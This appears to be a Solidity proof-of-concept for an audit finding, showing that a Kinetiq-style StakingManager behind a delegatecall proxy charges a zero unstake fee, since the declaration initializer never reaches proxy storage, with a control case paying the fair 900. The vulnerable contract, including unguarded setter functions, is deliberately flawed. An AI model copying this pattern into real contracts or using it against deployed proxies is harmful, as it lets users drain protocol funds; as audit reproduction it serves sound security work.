// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Kinetiq StakingManager — declaration initializer does not reach the proxy
    (Spearbit). The implementation sets unstakeFeeRate = 10 in its constructor.
    A delegation proxy does not run that constructor. Its slot 0 stays 0
    because the implementation address lives in the EIP-1967 slot, not in
    the fee slot. unstake through the proxy charges a 0 fee and pays 1,000.
    The fair fee is 100 and the fair payout is 900. The user is overpaid
    by 100. The control writes the fee into proxy storage, then pays 900. */

contract EthToken {
    string public constant symbol = "ETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract StakingManager {
    uint256 public unstakeFeeRate = 10;
    EthToken public ethToken;

    constructor(EthToken token) {
        ethToken = token;
    }

    function unstake(address to, uint256 amount) external returns (uint256 payout) {
        uint256 feeRate = unstakeFeeRate;
        uint256 fee = amount * feeRate / 100;
        payout = amount - fee;
        // @> VULN: the declaration initializer never wrote the proxy slot, so the fee is 0 and this transfer pays the full amount
        ethToken.transfer(to, payout);
    }

    function initializeFee() external {
        unstakeFeeRate = 10;
    }

    function setToken(EthToken token) external {
        ethToken = token;
    }
}

contract Proxy {
    bytes32 internal constant SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address impl) {
        assembly {
            sstore(SLOT, impl)
        }
    }

    fallback() external payable {
        bytes32 slot = SLOT;
        assembly {
            let impl := sload(slot)
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch ok
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

contract Exploit {
    EthToken public ethToken;
    StakingManager public implementation;
    Proxy public proxy;
    Proxy public controlProxy;
    uint256 public constant AMOUNT = 1_000e18;

    constructor() {
        ethToken = new EthToken();
        implementation = new StakingManager(ethToken);
        proxy = new Proxy(address(implementation));
        controlProxy = new Proxy(address(implementation));
    }

    function run() external {
        ethToken.mint(address(proxy), AMOUNT);
        ethToken.mint(address(controlProxy), AMOUNT);
        StakingManager(address(proxy)).setToken(ethToken);
        StakingManager(address(controlProxy)).setToken(ethToken);
        uint256 implRate = implementation.unstakeFeeRate();
        uint256 proxyRate = _proxyRate();
        uint256 paid = _unstake(proxy, msg.sender, AMOUNT);
        uint256 fairFee = AMOUNT * implRate / 100;
        uint256 fairPayout = AMOUNT - fairFee;
        StakingManager(address(controlProxy)).initializeFee();
        uint256 controlPaid = _unstake(controlProxy, address(0xF1), AMOUNT);
        require(implRate == 10, "implementation fee is 10");
        require(proxyRate == 0, "proxy fee is 0");
        require(paid == AMOUNT, "proxy paid 1000");
        require(fairPayout == 900e18, "fair payout 900");
        require(paid - fairPayout == 100e18, "overpaid 100");
        require(ethToken.balanceOf(msg.sender) == AMOUNT, "user received 1000");
        require(controlPaid == 900e18, "control pays 900");
        require(ethToken.balanceOf(address(0xF1)) == 900e18, "control user");
    }

    function _proxyRate() internal view returns (uint256 rate) {
        (bool ok, bytes memory ret) = address(proxy).staticcall(abi.encodeWithSignature("unstakeFeeRate()"));
        require(ok, "rate");
        rate = abi.decode(ret, (uint256));
    }

    function _unstake(Proxy target, address to, uint256 amount) internal returns (uint256 payout) {
        (bool ok, bytes memory ret) =
            address(target).call(abi.encodeCall(StakingManager.unstake, (to, amount)));
        require(ok, "unstake");
        payout = abi.decode(ret, (uint256));
    }
}
